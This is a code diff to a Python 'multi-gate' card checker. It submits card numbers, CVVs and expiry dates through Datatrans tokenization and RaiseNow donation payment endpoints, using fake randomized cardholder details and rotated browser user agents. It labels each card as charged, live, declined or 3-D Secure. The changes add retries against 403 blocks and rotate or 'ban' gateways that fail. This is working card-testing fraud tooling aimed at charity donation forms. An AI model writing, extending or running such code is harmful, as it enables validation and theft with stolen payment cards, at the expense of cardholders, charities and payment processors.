@@ -4,6 +4,7 @@ import json
 import random
 import string
 import logging
+import threading
 import importlib
 
 # --- MODIFIED: Import the module to allow reloading ---
@@ -13,6 +14,29 @@ importlib.reload(gate_configs_module)
 
 
 logger = logging.getLogger(__name__)
+
+# --- STATE MANAGEMENT FOR BANNED GATES (THREAD-SAFE) ---
+# This will store the names of gates that have failed repeatedly.
+_banned_gates = set()
+_ban_lock = threading.Lock()
+
+def get_banned_gates():
+    """Returns a copy of the currently banned gates."""
+    with _ban_lock:
+        return _banned_gates.copy()
+
+def ban_gate(gate_name):
+    """Adds a gate to the banned list."""
+    with _ban_lock:
+        _banned_gates.add(gate_name)
+    logger.warning(f"Gate '{gate_name}' has been temporarily banned due to repeated failures.")
+
+def unban_all_gates():
+    """Clears the banned gates list."""
+    with _ban_lock:
+        if _banned_gates:
+            logger.info(f"All banned gates have been reloaded: {_banned_gates}")
+            _banned_gates.clear()
 
 # --- UTILITY FUNCTIONS (COPIED FROM main.py for consistency) ---
 
@@ -47,189 +71,158 @@ def random_user_agent():
             f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
             f"Chrome/{chrome_version} Safari/{safari_version}")
 
-# --- REWRITTEN CHECKER LOGIC ---
+def make_request_with_special_retry(session, method, url, gate_name, max_retries=10, cancellation_event=None, **kwargs):
+    """
+    Custom retry function for Multi-Gate mode.
+    Retries on specific errors and can lead to banning a gate.
+    """
+    last_exception = None
+    for attempt in range(max_retries):
+        if cancellation_event and cancellation_event.is_set():
+            return None, "Operation cancelled by user", False # Not a ban-worthy failure
 
-def _perform_single_request(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
-    """
-    Internal function to perform a single check attempt against a specific gate.
-    This function does NOT handle retries. It just returns the raw result.
-    """
+        try:
+            response = session.request(method, url, **kwargs)
+            # A 403 Forbidden is a specific failure case we want to retry
+            if response.status_code == 403:
+                last_exception = requests.exceptions.HTTPError(f"403 Forbidden on attempt {attempt + 1}")
+                wait_time = attempt + 1
+                logger.warning(f"Gate '{gate_name}' returned 403. Attempt {attempt + 1}/{max_retries}. Retrying in {wait_time}s...")
+                time.sleep(wait_time)
+                continue
+            
+            # Any other successful or client-error response is returned immediately
+            return response, None, False
+
+        except requests.exceptions.RequestException as e:
+            last_exception = e
+            wait_time = attempt + 1
+            logger.warning(f"Request for gate '{gate_name}' failed: {e}. Attempt {attempt + 1}/{max_retries}. Retrying in {wait_time}s...")
+            time.sleep(wait_time)
+
+    # If all retries fail, we signal that the gate should be banned
+    final_error_message = f"All {max_retries} retry attempts for gate '{gate_name}' failed. Last error: {last_exception}"
+    logger.error(final_error_message)
+    return None, final_error_message, True # True indicates a ban-worthy failure
+
+# --- MAIN CHECKER LOGIC ---
+
+def _check_card_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
+    """Internal function to check a card against a specific gate configuration."""
     try:
-        # --- NEW: Added retry logic for TOKENIZATION_NOT_FOUND ---
-        max_token_retries = 5
-        for token_attempt in range(max_token_retries):
-            if cancellation_event and cancellation_event.is_set():
-                return 'cancelled', line, 'User cancelled', bin_info
+        # --- Generate random data based on gate config ---
+        user_agent = random_user_agent()
+        min_name, max_name = gate_config['name_length_range']
+        first_name = generate_random_string(random.randint(min_name, max_name))
+        last_name = generate_random_string(random.randint(min_name, max_name))
+        cardholder = f"{first_name} {last_name}"
+        email = random_email(gate_config['email_config'])
+        
+        street = generate_random_string(random.randint(20, 35))
+        house_number = generate_random_string(random.randint(20, 35))
+        postal_code = ''.join(random.choices(string.digits, k=5))
+        city = generate_random_string(random.randint(20, 35))
+        random_message = generate_random_string(random.randint(20, 35))
 
-            user_agent = random_user_agent()
-            min_name, max_name = gate_config['name_length_range']
-            first_name = generate_random_string(random.randint(min_name, max_name))
-            last_name = generate_random_string(random.randint(min_name, max_name))
-            cardholder = f"{first_name} {last_name}"
-            email = random_email(gate_config['email_config'])
-            
-            street = generate_random_string(random.randint(20, 35))
-            house_number = generate_random_string(random.randint(20, 35))
-            postal_code = ''.join(random.choices(string.digits, k=5))
-            city = generate_random_string(random.randint(20, 35))
-            random_message = generate_random_string(random.randint(20, 35))
+        # --- Step 1: Get Token for the card ---
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
+        tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
 
-            # --- Step 1: Tokenize ---
-            tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
-            tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
-            tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
-            
-            token_response = session.post(tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15)
-            
-            if token_response.status_code == 403:
-                return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Tokenize", bin_info
-
-            token_response.raise_for_status() # Raise HTTPError for other bad responses (4xx, 5xx)
-
-            if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
-            
+        token_response, error, should_ban = make_request_with_special_retry(session, 'post', tokenize_url, gate_name, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if should_ban:
+            ban_gate(gate_name)
+            return 'error', line, f"[{gate_name}] Banned after Tokenize Error: {error}", bin_info
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Tokenize Error: {error}", bin_info
+        
+        if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
+        try:
             token_data = token_response.json()
             if "error" in token_data and "message" in token_data.get("error", {}): return 'decline', line, f'[{gate_name}] {token_data["error"]["message"]}', bin_info
             transaction_id = token_data.get("transactionId")
             if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info
+        except json.JSONDecodeError:
+            return 'error', line, f"[{gate_name}] Tokenize response was not JSON: {token_response.text}", bin_info
 
-            # --- Step 2: Payment ---
-            payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
-            
-            payload_str = json.dumps(gate_config['payload'])
-            replacements = {
-                "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
-                "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
-                "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
-                "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
-                "{{message}}": random_message
-            }
-            for placeholder, value in replacements.items():
-                payload_str = payload_str.replace(placeholder, value)
-            
-            base_payload = json.loads(payload_str)
+        # --- Step 2: Perform payment/source request ---
+        payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
+        
+        payload_str = json.dumps(gate_config['payload'])
+        replacements = {
+            "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
+            "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
+            "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
+            "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
+            "{{message}}": random_message
+        }
+        for placeholder, value in replacements.items():
+            payload_str = payload_str.replace(placeholder, value)
+        
+        base_payload = json.loads(payload_str)
 
-            if mode == 'charge':
-                payment_url = "https://api.raisenow.io/payments"
-                payment_payload = base_payload
-                payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
-            else: # 'live' mode
-                payment_url = "https://api.raisenow.io/payment-sources"
-                payment_payload = base_payload
-                payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50}
+        if mode == 'charge':
+            payment_url = "https://api.raisenow.io/payments"
+            payment_payload = base_payload
+            payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
+        else: # 'live' mode
+            payment_url = "https://api.raisenow.io/payment-sources"
+            payment_payload = base_payload
+            payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50} 
 
-            payment_response = session.post(payment_url, json=payment_payload, headers=payment_headers, timeout=20)
-            
-            if payment_response.status_code == 403:
-                return 'gate_dead', line, f"[{gate_name}] GATE_DIED: 403 Forbidden on Payment", bin_info
-                
-            payment_response.raise_for_status()
+        payment_response, error, should_ban = make_request_with_special_retry(session, 'post', payment_url, gate_name, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if should_ban:
+            ban_gate(gate_name)
+            return 'error', line, f"[{gate_name}] Banned after Payment Error: {error}", bin_info
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Error: {error}", bin_info
 
-            response_text = payment_response.text
+        response_text = payment_response.text
+        if '"payment_status":"succeeded"' in response_text:
+            return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
+        elif '"payment_source_status":"pending"' in response_text:
+            return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
+        elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
+            return 'decline', line, f'[{gate_name}] DECLINED', bin_info
+        elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
+            return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
+        else:
+            return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info
 
-            # --- NEW: TOKENIZATION_NOT_FOUND RETRY LOGIC ---
-            if "TOKENIZATION_NOT_FOUND" in response_text:
-                if token_attempt < max_token_retries - 1:
-                    logger.warning(f"Card {line} on Gate '{gate_name}' got TOKENIZATION_NOT_FOUND. Retrying payment request... (Attempt {token_attempt + 1}/{max_token_retries})")
-                    time.sleep(1) # Wait before retrying
-                    continue # Retry the whole process from tokenization
-                else:
-                    logger.error(f"Card {line} on Gate '{gate_name}' failed with TOKENIZATION_NOT_FOUND after {max_token_retries} retries.")
-                    return 'decline', line, f'[{gate_name}] TOKENIZATION_NOT_FOUND_FAIL', bin_info
-            # --- END NEW LOGIC ---
-
-            if '"payment_status":"succeeded"' in response_text:
-                return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
-            elif '"payment_source_status":"pending"' in response_text:
-                return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
-            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
-                return 'decline', line, f'[{gate_name}] DECLINED', bin_info
-            elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
-                return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
-            else:
-                return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info
-
-    except requests.exceptions.RequestException as e:
-        logger.warning(f"Request failed for gate '{gate_name}': {e}")
-        return 'error', line, f"[{gate_name}] Connection Error: {e}", bin_info
-    except json.JSONDecodeError as e:
-        logger.error(f"JSON Decode Error for gate '{gate_name}' on card {line}: {e}", exc_info=True)
-        return 'error', line, f"[{gate_name}] JSON Decode Error: {e}", bin_info
     except Exception as e:
-        logger.error(f"Critical error in Generic Checker for gate '{gate_name}' on card {line}: {e}", exc_info=True)
+        logger.error(f"Unknown error in Generic Checker for gate '{gate_name}' on line '{line}': {e}", exc_info=True)
         return 'error', line, f"[{gate_name}] System Error: {e}", bin_info
 
-
-def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, custom_charge_amount, available_gates, retry_policy):
+def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, custom_charge_amount=None):
     """
-    REWRITTEN LOGIC:
-    Checks a single card against a list of available gates, handling retries and banning.
-    
-    Args:
-        available_gates (list): A list of gate names to try.
-        retry_policy (dict): A dictionary containing the number of retries, e.g., {'retries': 10}.
-        
-    Returns:
-        A tuple (status, line, response, bin_info).
-        - If successful: ('success', line, '...', bin_info)
-        - If a gate needs to be banned: ('needs_ban', line, 'gate_name_to_ban', bin_info)
-        - If all provided gates fail: ('all_gates_failed', line, 'Error message', bin_info)
+    Main function for Multi-Gate mode. It randomly selects an available (non-banned) gate and runs the check.
     """
-    if cancellation_event and cancellation_event.is_set():
-        return 'cancelled', line, 'User cancelled', bin_info
-
-    mode = get_mode_func()
-    charge_value = custom_charge_amount if custom_charge_amount is not None else 50
-    
-    # Loop through each available gate for the CURRENT card
-    for gate_name in available_gates:
-        if cancellation_event and cancellation_event.is_set():
-            return 'cancelled', line, 'User cancelled', bin_info
-
-        try:
-            gate_config = gate_configs_module.GATE_CONFIGS[gate_name]
-        except KeyError:
-            logger.warning(f"Gate '{gate_name}' not found in configuration, skipping.")
-            continue # Skip to the next gate if this one isn't configured
-
-        # Inner loop for retrying a SINGLE gate
-        for attempt in range(retry_policy['retries']):
-            if cancellation_event and cancellation_event.is_set():
-                return 'cancelled', line, 'User cancelled', bin_info
-                
-            status, _, response, _ = _perform_single_request(
-                session, line, cc, mes, ano, cvv, bin_info, cancellation_event, 
-                mode, charge_value, gate_name, gate_config
-            )
-            
-            # Check if the error is a type that should be retried
-            is_retryable_error = (
-                status == 'gate_dead' or 
-                (status == 'error' and response and ("Connection Error" in str(response) or "Proxy Error" in str(response) or "HTTP Error" in str(response)))
-            )
-
-            if is_retryable_error:
-                if attempt < retry_policy['retries'] - 1:
-                    logger.warning(f"Card {line} on Gate '{gate_name}' failed (Attempt {attempt + 1}/{retry_policy['retries']}). Retrying...")
-                    time.sleep(1) # Wait before retrying the SAME gate
-                    continue
-                else:
-                    # All retries for THIS gate failed. Signal to the main worker to ban it.
-                    logger.error(f"Card {line} on Gate '{gate_name}' failed after {retry_policy['retries']} retries. Signaling for ban.")
-                    status = 'needs_ban'
-                    response = gate_name # The response is the gate to ban
-                    break # Exit the retry loop for this gate
-            else:
-                # Got a definitive result (success, decline, 3d, etc.) or a non-retryable error
-                break # Exit the retry loop for this gate
+    try:
+        # --- MODIFIED: Use the reloaded module ---
+        all_gates = list(gate_configs_module.GATE_CONFIGS.keys())
+        banned_gates = get_banned_gates()
+        available_gates = [g for g in all_gates if g not in banned_gates]
         
-        # After the retry loop, check the result
-        if status == 'needs_ban':
-            # This gate failed permanently, continue to the next available gate
-            continue
-        else:
-            # We got a definitive result for the card, so we can stop checking other gates
-            return status, line, response, bin_info
+        if not available_gates:
+            logger.warning("All multi-gates are currently banned. Reloading the list.")
+            unban_all_gates()
+            # --- MODIFIED: Use the reloaded module ---
+            all_gates = list(gate_configs_module.GATE_CONFIGS.keys())
+            available_gates = all_gates
+            if not available_gates:
+                 return 'error', line, "No gates defined in gate_configurations.py", bin_info
 
-    # If this point is reached, it means the card was tried against all available_gates, and every single one of them failed and was banned.
-    return 'all_gates_failed', line, "All available gates failed for this card.", bin_info
+        random_gate_name = random.choice(available_gates)
+        # --- MODIFIED: Use the reloaded module ---
+        gate_config = gate_configs_module.GATE_CONFIGS[random_gate_name]
+        
+        mode = get_mode_func() 
+        charge_value = custom_charge_amount if custom_charge_amount is not None else 50 # Default charge 0.50
+        
+        logger.info(f"Running card on Multi-Gate mode, randomly selected: {random_gate_name}")
+        
+        return _check_card_generic(
+            session, line, cc, mes, ano, cvv, bin_info, cancellation_event, 
+            mode, charge_value, random_gate_name, gate_config
+        )
+    except Exception as e:
+        logger.error(f"Error in Multi-Gate selection process for line '{line}': {e}", exc_info=True)
+        return 'error', line, f"Multi-Gate Main Error: {e}", bin_info
